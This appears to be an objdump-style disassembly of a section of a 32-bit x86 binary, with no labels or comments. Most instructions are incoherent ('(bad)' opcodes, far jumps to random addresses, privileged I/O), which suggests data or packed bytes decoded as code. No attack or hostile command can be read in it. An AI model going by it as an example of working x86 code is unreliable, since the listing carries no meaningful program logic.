  40a113:	retf   0x344
  40a116:	mov    al,0x40
  40a118:	add    al,0x31
  40a11a:	or     DWORD PTR [eax],edx
  40a11c:	mov    edi,0xf9a1ac54
  40a121:	imul   ebx,DWORD PTR [eax],0xbad80b8
  40a127:	(bad)  
  40a129:	sub    eax,0x13bc95c8
  40a12e:	jnp    0x40a11d
  40a130:	pushf  
  40a131:	aas    
  40a132:	stos   BYTE PTR es:[edi],al
  40a133:	lea    ecx,[edx+0x7]
  40a136:	xlat   BYTE PTR ds:[ebx]
  40a137:	lahf   
  40a138:	inc    esp
  40a139:	sub    ecx,ebx
  40a13b:	and    esi,edx
  40a13d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a13e:	pop    ds
  40a13f:	mov    eax,ds:0xd8844922
  40a144:	jmp    0x40a11e
  40a146:	lds    ebx,FWORD PTR [esp+ebx*1-0x3eac2d1e]
  40a14d:	push   edx
  40a14e:	dec    ebp
  40a14f:	scas   eax,DWORD PTR es:[edi]
  40a150:	mov    al,ds:0xf57660b7
  40a155:	xor    bh,BYTE PTR [ecx+0x3e6d093d]
  40a15b:	daa    
  40a15c:	push   edi
  40a15d:	dec    ebx
  40a15e:	lds    esi,FWORD PTR ds:0x644a26aa
  40a164:	inc    eax
  40a165:	dec    esi
  40a166:	dec    ebp
  40a167:	int    0x43
  40a169:	mov    ecx,0x1f00eeda
  40a16e:	(bad)  
  40a16f:	push   ecx
  40a170:	ror    BYTE PTR [ecx+0x4f],0x8
  40a174:	hlt    
  40a175:	mov    ch,0xa1
  40a177:	push   ebx
  40a178:	jl     0x40a1f7
  40a17a:	xor    DWORD PTR [esi+0x2e1867a4],edx
  40a180:	xchg   ebx,eax
  40a181:	sub    al,0x84
  40a183:	stos   BYTE PTR es:[edi],al
  40a184:	jle    0x601d423a
  40a18a:	hlt    
  40a18b:	pop    esi
  40a18c:	daa    
  40a18d:	lods   eax,DWORD PTR ds:[esi]
  40a18e:	xor    eax,ebp
  40a190:	jp     0x40a1c1
  40a192:	jg     0x40a200
  40a194:	repz cmp al,0x91
  40a197:	jnp    0x40a131
  40a199:	pop    eax
  40a19a:	retf   
  40a19b:	mov    bh,0x76
  40a19d:	repnz imul ebx,DWORD PTR [eax],0x14acfee7
  40a1a4:	inc    ebx
  40a1a5:	jnp    0x40a1c0
  40a1a7:	popf   
  40a1a8:	jmp    0xa8c1:0x1cf8df1d
  40a1af:	dec    esp
  40a1b0:	add    DWORD PTR [ecx-0x336d1656],ecx
  40a1b6:	sub    DWORD PTR [edi],esp
  40a1b8:	test   al,0xe3
  40a1ba:	(bad)  
  40a1bb:	cmp    DWORD PTR [eax+ebx*8],ebp
  40a1be:	push   ebp
  40a1bf:	lock int3 
  40a1c1:	and    BYTE PTR ss:[ebx],0x29
  40a1c5:	rol    DWORD PTR [eax],0xf5
  40a1c8:	cmp    BYTE PTR [ebx+0x4fa26bbe],bl
  40a1ce:	pop    esi
  40a1cf:	adc    DWORD PTR [edx+0x7b],edx
  40a1d2:	fbld   TBYTE PTR [esi]
  40a1d4:	mov    bh,0xf4
  40a1d6:	xchg   ecx,eax
  40a1d7:	int    0xa8
  40a1d9:	or     al,0x1b
  40a1db:	aas    
  40a1dc:	mov    al,0x3e
  40a1de:	jno    0x40a186
  40a1e0:	dec    ebp
  40a1e1:	add    edi,DWORD PTR [eax-0x4f]
  40a1e4:	dec    ebx
  40a1e5:	xchg   ebp,eax
  40a1e6:	lahf   
  40a1e7:	ins    BYTE PTR es:[edi],dx
  40a1e8:	(bad)  
  40a1e9:	pop    esp
  40a1ea:	and    ecx,edx
  40a1ec:	ja     0x40a263
  40a1ee:	pop    ss
  40a1ef:	xchg   esi,eax
  40a1f0:	ret    
  40a1f1:	mov    eax,0xf7dc8e21
  40a1f6:	sub    cl,cl
  40a1f8:	ins    BYTE PTR es:[edi],dx
  40a1f9:	pushf  
  40a1fa:	mov    dl,0x3d
  40a1fc:	adc    eax,0x237a2184
  40a201:	dec    esi
  40a202:	add    al,0x74
  40a204:	cld    
  40a205:	or     DWORD PTR [edi+esi*1-0x51],0x437dcd95
  40a20d:	push   ebx
  40a20e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a20f:	jmp    0x40a194
  40a211:	dec    esi
  40a212:	jmp    0x40a1e7
  40a214:	adc    al,0x77
  40a216:	inc    ebx
  40a217:	loop   0x40a21c
  40a219:	mov    dl,0xa0
  40a21b:	inc    ecx
  40a21c:	fstp   QWORD PTR [edx]
  40a21e:	mov    eax,0x73b6736d
  40a223:	and    ecx,DWORD PTR [edx+0x227acf30]
  40a229:	mov    al,0x40
  40a22b:	inc    edi
  40a22c:	jp     0x40a210
  40a22e:	rcl    DWORD PTR [ecx+0x88b6586],0xc3
  40a235:	xor    bl,ch
  40a237:	push   0xffffffea
  40a239:	cmp    dl,BYTE PTR [ebp-0x76]
  40a23c:	pushf  
  40a23d:	gs jb  0x40a24b
  40a240:	adc    eax,0x6217c85
  40a245:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40a247:	dec    edx
  40a248:	pop    ecx
  40a249:	sbb    edi,ebx
  40a24b:	push   ecx
  40a24c:	xchg   DWORD PTR [eax-0x484f2187],esp
  40a252:	or     DWORD PTR [esi-0x50],0xffffffe7
  40a256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a257:	sub    DWORD PTR [ecx],0xffffffc9
  40a25a:	cmp    eax,0xa6039a06
  40a25f:	jo     0x40a296
  40a261:	cmc    
  40a262:	and    ah,BYTE PTR [ebp+0x3b35a8e7]
  40a268:	and    al,0x23
  40a26a:	push   0x74
  40a26c:	aad    0x16
  40a26e:	xor    al,0xff
  40a270:	sahf   
  40a271:	dec    esp
  40a272:	xor    al,0xef
  40a274:	bswap  ebp
  40a276:	cmp    al,0x86
  40a278:	push   ebp
  40a279:	add    DWORD PTR [ebx],0xfbb843d9
  40a27f:	dec    ebx
  40a280:	sbb    al,0xc2
  40a282:	cmp    al,0x89
  40a284:	mov    ebx,0x5e78f89f
  40a289:	or     ebp,DWORD PTR [eax+esi*1]
  40a28c:	bound  ebx,QWORD PTR ds:0xdde66031
  40a292:	sbb    dh,ch
  40a294:	pop    ebx
  40a295:	cmp    ecx,DWORD PTR [esi+0x58]
  40a298:	sbb    BYTE PTR [ebx-0x2c2372ff],bl
  40a29e:	inc    esi
  40a29f:	loopne 0x40a222
  40a2a1:	repz inc edi
  40a2a3:	push   0xe
  40a2a5:	call   0xcc16057d
  40a2aa:	mov    esi,0x9bbc2f1e
  40a2af:	retf   0x2089
  40a2b2:	push   esi
  40a2b3:	inc    ecx
  40a2b4:	jmp    0xef78a2e9
  40a2b9:	pop    edx
  40a2ba:	sub    ch,BYTE PTR [edx]
  40a2bc:	mov    BYTE PTR [eax+0x64002cf0],bh
  40a2c2:	out    0xe7,al
  40a2c4:	sbb    DWORD PTR [eax+0x20],ebx
  40a2c7:	mov    ah,0xc
  40a2c9:	clc    
  40a2ca:	fsub   st(3),st
  40a2cc:	jmp    0x40a2b6
  40a2ce:	test   DWORD PTR [edx-0x4],esp
  40a2d1:	jne    0x40a322
  40a2d3:	mov    esi,0x2c298e44
  40a2d8:	pop    eax
  40a2d9:	retf   0x7598
  40a2dc:	mov    dl,0x87
  40a2de:	xchg   esi,eax
  40a2df:	std    
  40a2e0:	adc    BYTE PTR ds:0x7be9c20c,ah
  40a2e6:	cwde   
  40a2e7:	add    DWORD PTR [bx],edx
  40a2ea:	test   DWORD PTR [esi],esp
  40a2ec:	adc    edi,0xffffffa6
  40a2ef:	xchg   ebx,eax
  40a2f0:	cmp    BYTE PTR [ebp+ebp*2+0x1c2a152],cl
  40a2f7:	mov    ebx,0xaadd489
  40a2fc:	jl     0x40a2e5
  40a2fe:	(bad)  
  40a2ff:	inc    si
  40a301:	popa   
  40a302:	fld    QWORD PTR [edx+edi*8-0x378e8783]
  40a309:	js     0x40a336
  40a30b:	mov    esp,0x4a425510
  40a310:	in     eax,dx
  40a311:	ret    
  40a312:	test   eax,0x1cd8a4ed
  40a317:	test   eax,0x672149d2
  40a31c:	mov    bl,BYTE PTR [ebx+0x52]
  40a31f:	push   edi
  40a320:	int    0xd0
  40a322:	inc    ecx
  40a323:	ss push es
  40a325:	jecxz  0x40a364
  40a327:	inc    ecx
  40a328:	int3   
  40a329:	dec    ebp
  40a32a:	sbb    ah,ah
  40a32c:	xchg   edx,eax
  40a32d:	inc    ecx
  40a32e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a32f:	push   ebp
  40a330:	ret    
  40a331:	jle    0x40a324
  40a333:	mov    ss,WORD PTR [eax]
  40a335:	pop    ss
  40a336:	frstor [edi]
  40a338:	cmp    DWORD PTR [esi],ebp
  40a33a:	je     0x40a33e
  40a33c:	icebp  
  40a33d:	inc    esi
  40a33e:	popf   
  40a33f:	xor    al,0x35
  40a341:	xor    DWORD PTR [ecx+0x7e3f4cca],esp
  40a347:	xor    eax,0xdd8f0de
  40a34c:	nop
  40a34d:	inc    edi
  40a34e:	pop    edx
  40a34f:	fsubr  DWORD PTR ds:0x5b1b2cf6
  40a355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a356:	call   0xd38677db
  40a35b:	(bad)  [edx*1+0x659e5161]
  40a362:	cmp    al,0xb6
  40a364:	call   0xa9ae:0x4e0ff53d
  40a36b:	lods   eax,DWORD PTR ds:[esi]
  40a36c:	std    
  40a36d:	ss xchg edx,eax
  40a36f:	jmp    0xda7e:0x33f86716
  40a376:	loope  0x40a3d7
  40a378:	add    eax,0xe99fbaf3
  40a37d:	fidivr WORD PTR [eax]
  40a37f:	test   al,0x96
  40a381:	add    DWORD PTR [ebx],esp
  40a383:	sub    edi,ecx
  40a385:	xchg   esp,eax
  40a386:	pop    ecx
  40a387:	jns    0x40a3f2
  40a389:	stos   DWORD PTR es:[edi],eax
  40a38a:	xchg   esp,eax
  40a38b:	inc    eax
  40a38c:	out    dx,eax
  40a38d:	es mov ecx,0xcee08794
  40a393:	dec    eax
  40a394:	mov    ds:0xc955a715,eax
  40a399:	mov    al,ds:0x5ad25f72
  40a39e:	fstp   DWORD PTR [ecx+edi*1-0x58]
  40a3a2:	push   0x18010e9e
  40a3a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3a8:	or     eax,0x9b46b4b4
  40a3ad:	fdivr  st(0),st
  40a3af:	cwde   
  40a3b0:	ret    
  40a3b1:	jg     0x40a38e
  40a3b3:	mov    ch,0xda
  40a3b5:	in     al,dx
  40a3b6:	dec    ebx
  40a3b7:	sbb    bl,BYTE PTR [esi+eiz*1+0x3f]
  40a3bb:	sub    BYTE PTR [edx],0xbf
  40a3be:	int3   
  40a3bf:	in     eax,0xcf
  40a3c1:	inc    ebp
  40a3c2:	xor    ecx,esi
  40a3c4:	mov    ds:0xbc14f1ae,al
  40a3c9:	and    cl,BYTE PTR [edi]
  40a3cb:	pusha  
  40a3cc:	arpl   WORD PTR [esi],bx
  40a3ce:	add    DWORD PTR [esi-0x42],esp
  40a3d1:	push   esi
  40a3d2:	adc    BYTE PTR [edi-0x2c],cl
  40a3d5:	pop    esi
  40a3d6:	ret    0x9c3e
  40a3d9:	fwait
  40a3da:	add    ecx,DWORD PTR gs:[esi]
  40a3dd:	sbb    esi,edx
  40a3df:	inc    edi
  40a3e0:	sbb    eax,0xfa016ff7
  40a3e5:	repnz outs dx,BYTE PTR ds:[esi]
  40a3e7:	push   edi
  40a3e8:	popf   
  40a3e9:	scas   al,BYTE PTR es:[edi]
  40a3ea:	xor    al,0xd8
  40a3ec:	call   0x367d:0x7be84dbd
  40a3f3:	lahf   
  40a3f4:	cwde   
  40a3f5:	addr16 je 0x40a457
  40a3f8:	pop    ebp
  40a3f9:	xchg   ebp,eax
  40a3fa:	xor    dl,dl
  40a3fc:	jo     0x40a46b
  40a3fe:	dec    ebp
  40a3ff:	aaa    
  40a400:	jge    0x40a3c6
  40a402:	data16 sbb BYTE PTR [edi],ah
  40a405:	pop    es
  40a406:	ins    DWORD PTR es:[edi],dx
  40a407:	sbb    ecx,esp
  40a409:	stos   BYTE PTR es:[edi],al
  40a40a:	icebp  
  40a40b:	xchg   ebp,eax
  40a40c:	sub    BYTE PTR [ebp+0x5a0060c1],dl
  40a412:	call   0x9f3c374a
  40a417:	pop    es
  40a418:	popf   
  40a419:	loope  0x40a40d
  40a41b:	or     al,0x88
  40a41d:	xchg   DWORD PTR [ebp-0x431a4673],ecx
  40a423:	cmc    
  40a424:	mov    esp,0x45e40e6c
  40a429:	imul   eax,DWORD PTR [eax],0xfffffffa
  40a42c:	xlat   BYTE PTR ds:[ebx]
  40a42d:	and    esp,DWORD PTR [ebx+0x30339f6]
  40a433:	outs   dx,DWORD PTR ds:[esi]
  40a434:	int3   
  40a435:	and    BYTE PTR ds:0x3799b84a,cl
  40a43b:	pop    esp
  40a43c:	test   ch,al
  40a43e:	stos   BYTE PTR es:[edi],al
  40a43f:	arpl   WORD PTR [esi+0x3e1c190f],cx
  40a445:	mov    bh,0x29
  40a447:	mov    cl,BYTE PTR [ecx+0x48c9d40]
  40a44d:	cmp    al,0x83
  40a44f:	jge    0x40a479
  40a451:	mov    bl,0xd6
  40a453:	adc    al,0x80
  40a455:	pop    ebx
  40a456:	into   
  40a457:	lock add eax,0x68bf32ff
  40a45d:	pop    edx
  40a45e:	mov    al,0xbe
  40a460:	cmp    BYTE PTR [ebp+0x79],dh
  40a463:	jge    0x40a46c
  40a465:	or     al,0xa3
  40a467:	xchg   DWORD PTR [edi-0x13],ebx
  40a46a:	sar    BYTE PTR ds:0x345917a3,1
  40a470:	cmp    bl,BYTE PTR [edi+eiz*4-0x13]
  40a474:	inc    esi
  40a475:	jbe    0x40a472
  40a477:	pop    ss
  40a478:	xor    DWORD PTR [edi+esi*1],edi
  40a47b:	or     al,0xa6
  40a47d:	mov    eax,0xb1d5cc2f
  40a482:	sub    al,0x42
  40a484:	mov    ?,edi
  40a486:	daa    
  40a487:	clc    
  40a488:	xchg   DWORD PTR [ebp-0x2da10fe8],ebx
  40a48e:	das    
  40a48f:	fcomp  st(3)
  40a491:	fild   QWORD PTR [ebp+0x2b7dc27a]
  40a497:	scas   eax,DWORD PTR es:[edi]
  40a498:	or     al,0x43
  40a49a:	xchg   BYTE PTR [ecx-0x2a],al
  40a49d:	inc    ebp
  40a49e:	pop    esi
  40a49f:	or     DWORD PTR [ebp+eiz*4+0xe],edi
  40a4a3:	jp     0x40a499
  40a4a5:	mov    eax,ebp
  40a4a7:	ret    0xc312
  40a4aa:	adc    ah,ah
  40a4ac:	xor    eax,0xd7e5dedc
  40a4b1:	adc    eax,0xa9020090
  40a4b6:	dec    eax
  40a4b7:	jl     0x40a4ce
  40a4b9:	fimul  DWORD PTR [ebx-0x79512621]
  40a4bf:	sub    eax,0x9cb4f1d2
  40a4c4:	jp     0x40a4e9
  40a4c6:	rol    esp,0xde
  40a4c9:	(bad)
  40a4cd:	sbb    DWORD PTR [edi],0xffffff86
  40a4d0:	je     0x40a49f
  40a4d2:	inc    ecx
  40a4d3:	pop    ebp
  40a4d4:	cli    
  40a4d5:	sbb    eax,0xe0214150
  40a4da:	jl     0x40a476
  40a4dc:	(bad)  
  40a4dd:	(bad)  
  40a4de:	ror    BYTE PTR [ebx-0x152ba846],1
  40a4e4:	into   
  40a4e5:	sbb    BYTE PTR cs:[ebp+0x505dff96],ah
  40a4ec:	mov    cx,WORD PTR [edx]
  40a4ef:	and    bl,BYTE PTR [ebx-0x39]
  40a4f2:	aas    
  40a4f3:	add    cl,BYTE PTR [esi+ebx*4+0x52aa293f]
  40a4fa:	push   edx
  40a4fb:	gs xchg edi,eax
  40a4fd:	int3   
  40a4fe:	inc    ebx
  40a4ff:	ret    
  40a500:	or     DWORD PTR [edi-0x241c69f9],0x54a9bcfe
  40a50a:	add    BYTE PTR [edi-0x5f],cl
  40a50d:	and    eax,0x162298b8
  40a512:	repz mov eax,ss:0x650d4e9f
  40a519:	iret   
  40a51a:	loopne 0x40a507
  40a51c:	popf   
  40a51d:	mov    ds:0xad059077,eax
  40a522:	push   esp
  40a523:	cwde   
  40a524:	sahf   
  40a525:	pmaxub mm1,QWORD PTR [ecx]
  40a528:	les    esi,FWORD PTR [edi+eax*1-0x64]
  40a52c:	sbb    bx,WORD PTR [eax+0x709c64df]
  40a533:	inc    esp
  40a534:	xor    BYTE PTR [ebx-0x80],cl
  40a537:	and    eax,DWORD PTR [edx+eax*4-0x7ed20505]
  40a53e:	popa   
  40a53f:	xchg   DWORD PTR [ebx+0x10],edi
  40a542:	mov    ah,0xab
  40a544:	out    0x55,al
  40a546:	retf   
  40a547:	jnp    0x40a57f
  40a549:	mov    dh,0xc
  40a54b:	in     eax,0x9a
  40a54d:	pop    ds
  40a54e:	xor    ecx,DWORD PTR ds:0x84c7f5b6
  40a554:	inc    esi
  40a555:	mov    esi,0x71c2d69
  40a55a:	imul   si,WORD PTR [ecx+0x3a],0x797a
  40a560:	loopne 0x40a5bc
  40a562:	sbb    al,0x6d
  40a564:	mov    cl,0x84
  40a566:	mov    dl,0x63
  40a568:	add    BYTE PTR [esi+eiz*2],dl
  40a56b:	jno    0x40a5c6
  40a56d:	iret   
  40a56e:	mov    al,ds:0xa0ae538a
  40a573:	xor    ebp,esi
  40a575:	xchg   BYTE PTR [ebp+0x2b63347d],ah
  40a57b:	jp     0x40a5b3
  40a57d:	jb     0x40a548
  40a57f:	mov    eax,0xd0436139
  40a584:	loopne 0x40a597
  40a586:	retf   
  40a587:	dec    eax
  40a588:	pop    ebx
  40a589:	push   esp
  40a58a:	pusha  
  40a58b:	call   DWORD PTR gs:[edx+ecx*8+0x0]
  40a590:	add    ebx,DWORD PTR [esi]
  40a592:	jae    0x40a55c
  40a594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a595:	xor    BYTE PTR [ebx+eax*2],0xbd
  40a599:	cmp    al,0xd5
  40a59b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a59c:	loop   0x40a578
  40a59e:	pop    ecx
  40a59f:	mov    dh,0x77
  40a5a1:	lock jmp 0x6e5458d9
  40a5a7:	mov    ebp,DWORD PTR ds:[ecx-0x2511536]
  40a5ae:	sbb    ecx,DWORD PTR [edi+0x54]
  40a5b1:	and    al,0x30
  40a5b3:	test   al,0xb3
  40a5b5:	cwde   
  40a5b6:	out    0x7b,eax
  40a5b8:	xchg   edx,eax
  40a5b9:	adc    eax,0x6c175a91
  40a5be:	jbe    0x40a5d2
  40a5c0:	adc    eax,0x5f3f760f
  40a5c5:	scas   eax,DWORD PTR es:[edi]
  40a5c6:	fidiv  WORD PTR [edx+0x4de06109]
  40a5cc:	xor    al,0x83
  40a5ce:	in     al,dx
  40a5cf:	sub    al,0x1b
  40a5d1:	sub    DWORD PTR [eax-0x1becb396],eax
  40a5d7:	jge    0x40a5ef
  40a5d9:	sahf   
  40a5da:	shl    ch,1
  40a5dc:	loope  0x40a5ff
  40a5de:	loop   0x40a570
  40a5e0:	add    DWORD PTR [esi+0x2143fc02],esp
  40a5e6:	stc    
  40a5e7:	mov    al,gs:0x678441b3
  40a5ed:	mov    ch,0x10
  40a5ef:	fild   DWORD PTR ds:0x2d9b23d9
  40a5f5:	test   BYTE PTR [edx-0x332b2de1],ah
  40a5fb:	adc    eax,DWORD PTR [ebp+0x39e463d4]
  40a601:	push   ebx
  40a602:	pop    es
  40a603:	lods   eax,DWORD PTR ds:[esi]
  40a604:	mov    dh,0x90
  40a606:	mov    esi,0x2cd236fc
  40a60b:	pop    ss
  40a60c:	mov    edx,0x31e52de1
  40a611:	mov    dh,0xb0
  40a613:	cmp    bh,bl
  40a615:	test   BYTE PTR [edx+0x50],0x6
  40a619:	clc    
  40a61a:	adc    eax,0x99a623c3
  40a61f:	jmp    0x8f763014
  40a624:	pushf  
  40a625:	sbb    BYTE PTR [ecx],dh
  40a627:	popa   
  40a628:	mov    ebx,DWORD PTR [eax-0x59]
  40a62b:	rcl    DWORD PTR [edi],0x34
  40a62e:	jp     0x40a62a
  40a630:	imul   eax,DWORD PTR ds:0x7fda9086,0xffffffa8
  40a637:	jmp    0x5e63:0x3d78348f
  40a63e:	das    
  40a63f:	mov    WORD PTR [ebp-0x5d6c7ef1],es
  40a645:	adc    al,0x85
  40a647:	inc    ebx
  40a648:	lock and esi,ecx
  40a64b:	sbb    DWORD PTR [edx+ebx*2-0x3c],ecx
  40a64f:	test   BYTE PTR [esi-0x4405151b],0x6d
  40a656:	dec    esi
  40a657:	ficomp WORD PTR [bp+si-0x37b2]
  40a65c:	jl     0x40a5fa
  40a65e:	xor    BYTE PTR [edx-0x4a],dl
  40a661:	repz loope 0x40a5fe
  40a664:	mov    dl,0x76
  40a666:	sub    al,0xef
  40a668:	push   edx
  40a669:	dec    esi
  40a66a:	mov    edi,0x277c30a6
  40a66f:	pop    edi
  40a670:	lahf   
  40a671:	cmp    cl,BYTE PTR [edi]
  40a673:	jmp    0x7189:0x43aceaee
  40a67a:	mov    bh,0xeb
  40a67c:	inc    ebp
  40a67d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a67e:	adc    al,0x8b
  40a680:	adc    al,BYTE PTR [si]
  40a683:	mov    bl,0x3f
  40a685:	gs in  eax,0x2
  40a688:	clc    
  40a689:	cmp    al,0xe2
  40a68b:	mov    ecx,0xcc2e86a9
  40a690:	sar    BYTE PTR [edx+0x46e55d75],0x73
  40a697:	jge    0x40a619
  40a699:	dec    eax
  40a69a:	adc    BYTE PTR [esi-0x1f],dl
  40a69d:	mov    al,dh
  40a69f:	sbb    al,0x99
  40a6a1:	pop    ebp
  40a6a2:	inc    ebx
  40a6a3:	mov    ebp,0xf126a43d
  40a6a8:	mov    al,ds:0x15566516
  40a6ad:	data16 mov ?,WORD PTR ds:0x9cbda004
  40a6b4:	shl    ebx,1
  40a6b6:	ja     0x40a69a
  40a6b8:	leave  
  40a6b9:	push   cs
  40a6ba:	adc    al,0x61
  40a6bc:	or     eax,0xb24267d1
  40a6c1:	xor    ebp,DWORD PTR [esp+eax*1]
  40a6c4:	ins    DWORD PTR es:[edi],dx
  40a6c5:	adc    esi,ebp
  40a6c7:	stos   DWORD PTR es:[edi],eax
  40a6c8:	jbe    0x40a736
  40a6ca:	dec    esi
  40a6cb:	retf   
  40a6cc:	push   ebx
  40a6cd:	pop    ebp
  40a6ce:	(bad)  
  40a6cf:	jg     0x40a748
  40a6d1:	jno    0x40a724
  40a6d3:	inc    edi
  40a6d4:	inc    di
  40a6d6:	mov    bh,0x81
  40a6d8:	fist   DWORD PTR [esi]
  40a6da:	fiadd  DWORD PTR [esi-0x6e]
  40a6dd:	addr16 int 0xe5
  40a6e0:	dec    esi
  40a6e1:	push   ecx
  40a6e2:	cld    
  40a6e3:	dec    eax
  40a6e4:	jb     0x40a6f3
  40a6e6:	inc    edx
  40a6e7:	xor    al,0x41
  40a6e9:	or     BYTE PTR [edx],ch
  40a6eb:	xchg   esp,eax
  40a6ec:	dec    eax
  40a6ed:	sub    BYTE PTR [edx+0x374336f2],bh
  40a6f3:	fidiv  DWORD PTR [edx+0x36358ba0]
  40a6f9:	stos   DWORD PTR es:[edi],eax
  40a6fa:	es sahf 
  40a6fc:	sub    BYTE PTR [edi],cl
  40a6fe:	cmp    edx,esi
  40a700:	sub    BYTE PTR [edx],bl
  40a702:	or     eax,0x58d1503c
  40a707:	inc    BYTE PTR [edx]
  40a709:	xchg   bl,cl
  40a70b:	mov    BYTE PTR [ecx+0x5b64e400],cl
  40a711:	inc    ebp
  40a712:	xchg   ebp,eax
  40a713:	pop    ss
  40a714:	sub    cl,BYTE PTR [esi+eax*1-0x80]
  40a718:	stos   DWORD PTR es:[edi],eax
  40a719:	stos   BYTE PTR es:[edi],al
  40a71a:	add    eax,0xba02ccb7
  40a71f:	lea    esi,[ebp+0x36def419]
  40a725:	xchg   BYTE PTR [esi+ecx*8],al
  40a728:	jge    0x40a6b2
  40a72a:	mov    dl,0x48
  40a72c:	dec    eax
  40a72d:	pop    ecx
  40a72e:	ret    
  40a72f:	inc    esp
  40a730:	pop    ebx
  40a731:	add    ecx,DWORD PTR [esi]
  40a733:	sbb    al,0x74
  40a735:	add    dh,BYTE PTR [ebx]
  40a737:	in     eax,dx
  40a738:	mov    esi,esi
  40a73a:	(bad)  
  40a73b:	dec    edi
  40a73c:	mov    ds:0x6db82c7a,al
  40a741:	add    ch,BYTE PTR [ebx+esi*2]
  40a744:	sbb    DWORD PTR [edi-0x213c36e5],0x73
  40a74b:	shl    BYTE PTR [edi+0x24],cl
  40a74e:	scas   al,BYTE PTR es:[edi]
  40a74f:	out    dx,al
  40a750:	leave  
  40a751:	test   eax,0xb5d7c3a9
  40a756:	(bad)  
  40a757:	outs   dx,DWORD PTR ds:[esi]
  40a758:	adc    DWORD PTR [edi+0x5eff0ee0],edi
  40a75e:	and    eax,0x5a1d859d
  40a763:	mov    eax,0x7e1eccac
  40a768:	mov    ds:0xe0a44dfb,eax
  40a76d:	popa   
  40a76e:	icebp  
  40a76f:	arpl   WORD PTR [ebx],cx
  40a771:	cmp    BYTE PTR [eax+0x79ed7488],bl
  40a777:	shr    DWORD PTR ds:0x23d38e97,0x9c
  40a77e:	ins    BYTE PTR es:[edi],dx
  40a77f:	and    eax,0x7f51a14b
  40a784:	and    dh,0xf1
  40a787:	lock sbb DWORD PTR [esi-0xc10ecb0],esi
  40a78e:	xor    BYTE PTR [edi],0x9b
  40a791:	cwde   
  40a792:	and    ah,BYTE PTR [ecx+0x4c]
  40a795:	inc    ecx
  40a796:	rcr    DWORD PTR [ecx+edx*8-0x521e0ab8],1
  40a79d:	clc    
  40a79e:	into   
  40a79f:	ins    BYTE PTR es:[edi],dx
  40a7a0:	pushf  
  40a7a1:	adc    al,BYTE PTR [eax]
  40a7a3:	adc    BYTE PTR [esi],0xfc
  40a7a6:	mov    ebp,0xee7f1f2
  40a7ab:	pop    ebp
  40a7ac:	mov    esp,0x217e0b08
  40a7b1:	inc    eax
  40a7b2:	dec    ebp
  40a7b3:	dec    edx
  40a7b4:	push   ebx
  40a7b5:	call   0xd0f0:0xdfb834ac
  40a7bc:	xor    eax,0xf4f3602
  40a7c1:	in     al,0x5a
  40a7c3:	dec    eax
  40a7c4:	fiadd  DWORD PTR [edi+eax*2-0x7a]
  40a7c8:	sub    al,0x5e
  40a7ca:	das    
  40a7cb:	ret    
  40a7cc:	into   
  40a7cd:	push   eax
  40a7ce:	fnstenv [ebx+edx*4+0x50]
  40a7d2:	fist   DWORD PTR [ebx]
  40a7d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7d5:	or     ebp,esp
  40a7d7:	sbb    DWORD PTR [esp+eax*1],ebp
  40a7da:	das    
  40a7db:	push   0x6f
  40a7dd:	or     BYTE PTR cs:[ecx+edi*1+0x18e8b340],dh
  40a7e5:	clc    
  40a7e6:	test   DWORD PTR [ebx],esi
  40a7e8:	ja     0x40a7f9
  40a7ea:	mov    edx,0x74080dfd
  40a7ef:	(bad)  
  40a7f0:	xor    ebx,DWORD PTR [ebp+0x42cd2e11]
  40a7f6:	in     al,dx
  40a7f7:	and    ch,0x6d
  40a7fa:	icebp  
  40a7fb:	push   ebx
  40a7fc:	popf   
  40a7fd:	cmp    DWORD PTR [edx+eiz*2-0x3198a189],ecx
  40a804:	dec    edx
  40a805:	out    0x52,al
  40a807:	pop    edx
  40a808:	push   es
  40a809:	mov    ch,0xbc
  40a80b:	jmp    0x18bd872b
  40a810:	ret    0xe5d0
  40a813:	jmp    0x40a7a9
  40a815:	push   esi
  40a816:	sub    DWORD PTR [eax-0x39],esp
  40a819:	lods   al,BYTE PTR ds:[esi]
  40a81a:	add    BYTE PTR [edx+0x76],cl
  40a81d:	scas   al,BYTE PTR es:[edi]
  40a81e:	add    al,0x70
  40a820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a821:	loopne 0x40a8a1
  40a823:	push   esp
  40a824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a825:	div    DWORD PTR [eax+0x31]
  40a828:	inc    ebx
  40a829:	and    bl,BYTE PTR [eax+0x2a]
  40a82c:	bound  esi,QWORD PTR [ebp-0x4d2ef498]
  40a832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a833:	jmp    0x369b:0x83566056
  40a83a:	xchg   esi,eax
  40a83b:	dec    ebx
  40a83c:	fistp  QWORD PTR [ebx+0x25]
  40a83f:	push   0x3999111d
  40a844:	or     al,BYTE PTR [eiz*4-0x4e57d975]
  40a84b:	not    cl
  40a84d:	push   esi
  40a84e:	addr16 pop eax
  40a850:	dec    edi
  40a851:	(bad)  
  40a852:	in     eax,dx
  40a853:	cmp    ch,BYTE PTR [esi+0x6958b523]
  40a859:	mov    bh,0x8e
  40a85b:	inc    ecx
  40a85c:	xchg   esi,eax
  40a85d:	inc    ecx
  40a85e:	shr    BYTE PTR [ebx+eax*8],0x47
  40a862:	xor    BYTE PTR [esi+edx*4+0xbeff230],al
  40a869:	adc    BYTE PTR [eax-0x7025dae5],0xb2
  40a870:	inc    eax
  40a871:	jmp    0x40a83d
  40a873:	fwait
  40a874:	add    ah,BYTE PTR [ecx]
  40a876:	mov    eax,0xbc8ba109
  40a87b:	std    
  40a87c:	cli    
  40a87d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a87e:	test   edx,ebx
  40a880:	mov    WORD PTR [eax+edx*1],cs
  40a883:	jae    0x40a838
  40a885:	js     0x40a8e4
  40a887:	and    BYTE PTR [ecx-0x59],dl
  40a88a:	push   esp
  40a88b:	inc    ebx
